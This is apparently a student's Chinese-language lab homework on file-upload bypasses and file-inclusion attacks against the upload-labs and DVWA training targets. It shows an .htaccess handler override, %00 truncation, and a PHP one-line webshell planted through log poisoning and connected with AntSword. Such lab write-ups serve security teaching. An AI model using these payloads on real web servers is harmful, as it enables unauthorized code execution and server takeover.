## 1.文件上传

- 客户端绕过练习。

  浏览器按F12打开控制台，再按F1禁用JS代码

  浏览器控制台直接删掉前端form标签的事件

  先上传符合白名单格式的文件类型，然后用burp抓包改成php文件即可绕过限制

- 服务端黑名单绕过：.htaccess 文件绕过。

  使用.htaccess文件前提条件
  1.mod_rewrite模块开启
  2.AllowOverride All

  

  首先将.htaccess文件上传，使当前目录所有的文件都用php解析，内容如下

  <FilesMatch "s.jpg">
  Sethandler application/x-httpd-php
  </FilesMatch>

  <IfModule mime_module>
  SetHandler application/x-httpd-php
  </IfModule>

  之后再上传s.jpg即可绕过限制

- 服务端白名单绕过：%00 截断绕过，要求虚拟机中搭建实验环境，分别实现 GET、POST 方法的绕过。

  GET 搭建好环境之后先上传文件s.jpg，然后用burp抓包，在upload后面添加1.php%00即可上传成功

  ![1](C:\Users\七号程序员詹姆师\Desktop\week9\1.png)

  ![2](C:\Users\七号程序员詹姆师\Desktop\week9\2.png)

  POST 先上传文件s.jpg，然后用burp抓包，在upload后面添加2.php%00，同时对%00进行URL解码，即可上传成功

  ![3](C:\Users\七号程序员詹姆师\Desktop\week9\3.png)

  ![4](C:\Users\七号程序员詹姆师\Desktop\week9\4.png)

- 二次渲染绕过。

  首先选择gif类型的图片，上传之后，将二次渲染的图片下载下来，在010Editor将上传前后的图片进行比对。找到二次渲染没有变动的位置，添加一句话木马然后上传，复制图片链接，用蚁剑连接打开，成功getshell

![5](C:\Users\七号程序员詹姆师\Desktop\week9\5.png)

## 2.文件包含

- DVWA 环境下包含其他目录的任意 3 个文件，要求使用相对路径。

![6](C:\Users\七号程序员詹姆师\Desktop\week9\6.png)

![7](C:\Users\七号程序员詹姆师\Desktop\week9\7.png)

![8](C:\Users\七号程序员詹姆师\Desktop\week9\8.png)

- 远程文件包含。

将s.txt绕过限制，上传到upload-labs，复制图片链接，在dvwa靶场page后粘贴链接访问即可完成远程文件包含

![9](C:\Users\七号程序员詹姆师\Desktop\week9\9.png)

- 中间件日志包含绕过，要求使用蚁剑连接成功。

先进行对文件夹和目录的提权

![10](C:\Users\七号程序员詹姆师\Desktop\week9\10.png)

然后在dvwa靶场page后访问<?php eval(@$_POST['a']);?>   用burp抓包，将URL编码修改为原字符

在dvwa靶场page后访问/var/log/apache2/access.log，复制链接和cookie，连接蚁剑

![11](C:\Users\七号程序员詹姆师\Desktop\week9\11.png)

